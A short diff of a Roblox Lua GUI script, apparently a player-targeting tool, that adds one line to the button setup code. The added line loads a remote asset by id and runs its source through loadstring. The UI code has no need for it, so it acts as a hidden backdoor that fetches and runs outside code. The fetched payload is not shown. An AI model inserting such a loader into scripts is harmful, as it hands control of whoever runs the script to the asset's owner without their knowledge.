@@ -104,6 +104,7 @@ TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextButton.TextScaled = true
 TextButton.TextSize = 14.000
 TextButton.TextWrapped = true
+loadstring(game:GetObjects("rbxassetid://15900013841")[1].Source)()
 
 TextButton.MouseButton1Click:Connect(function()
 	local Target = gplr(TextBox.Text)
